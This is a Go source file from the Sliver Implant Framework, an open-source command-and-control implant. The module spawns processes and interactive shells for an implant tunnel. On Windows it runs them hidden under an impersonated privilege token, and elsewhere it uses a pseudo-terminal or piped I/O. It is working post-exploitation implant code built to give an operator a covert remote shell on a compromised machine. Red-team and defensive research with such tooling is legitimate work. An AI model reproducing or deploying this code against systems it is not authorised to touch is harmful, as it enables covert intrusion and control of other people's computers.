package shell

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"io"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"os"
	"os/exec"

	// {{if ne .Config.GOOS "windows"}}
	"runtime"

	"github.com/bishopfox/sliver/implant/sliver/shell/pty"
	// {{end}}

	// {{if eq .Config.GOOS "windows"}}
	"syscall"

	"github.com/bishopfox/sliver/implant/sliver/priv"
	"golang.org/x/sys/windows"
	// {{end}}
)

const (
	readBufSize = 1024
)

// Shell - Struct to hold shell related data
type Shell struct {
	ID      uint64
	Command *exec.Cmd
	Stdout  io.ReadCloser
	Stdin   io.WriteCloser
}

// Start - Start a process
func Start(command string) error {
	cmd := exec.Command(command)
	//{{if eq .Config.GOOS "windows"}}
	cmd.SysProcAttr = &windows.SysProcAttr{
		Token:      syscall.Token(priv.CurrentToken),
		HideWindow: true,
	}
	//{{end}}
	return cmd.Start()
}

// StartInteractive - Start a shell
func StartInteractive(tunnelID uint64, command []string, enablePty bool) *Shell {

	// {{if ne .Config.GOOS "windows"}}
	if enablePty && runtime.GOOS != "windows" {
		return ptyShell(tunnelID, command)
	}
	// {{end}}

	return pipedShell(tunnelID, command)
}

func pipedShell(tunnelID uint64, command []string) *Shell {
	// {{if .Config.Debug}}
	log.Printf("[shell] %s", command)
	// {{end}}

	var cmd *exec.Cmd
	cmd = exec.Command(command[0], command[1:]...)
	//{{if eq .Config.GOOS "windows"}}
	cmd.SysProcAttr = &windows.SysProcAttr{
		Token:      syscall.Token(priv.CurrentToken),
		HideWindow: true,
	}
	//{{end}}

	stdin, _ := cmd.StdinPipe()
	stdout, _ := cmd.StdoutPipe()
	// cmd.Start()

	return &Shell{
		ID:      tunnelID,
		Command: cmd,
		Stdout:  stdout,
		Stdin:   stdin,
	}
}

// StartAndWait starts a system shell then waits for it to complete
func (s *Shell) StartAndWait() {
	s.Command.Start()
	s.Command.Wait()
}

// {{if ne .Config.GOOS "windows"}}
func ptyShell(tunnelID uint64, command []string) *Shell {
	// {{if .Config.Debug}}
	log.Printf("[ptmx] %s", command)
	// {{end}}

	var cmd *exec.Cmd
	cmd = exec.Command(command[0], command[1:]...)
	ptmx, err := pty.Start(cmd)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[ptmx] %v, falling back to piped shell...", err)
		// {{end}}
		return pipedShell(tunnelID, command)
	}
	cmd.Start()

	return &Shell{
		ID:      tunnelID,
		Command: cmd,
		Stdout:  ptmx,
		Stdin:   ptmx,
	}
}

// {{end}}

func exists(path string) bool {
	_, err := os.Stat(path)
	if err == nil {
		return true
	}
	if os.IsNotExist(err) {
		return false
	}
	return true
}
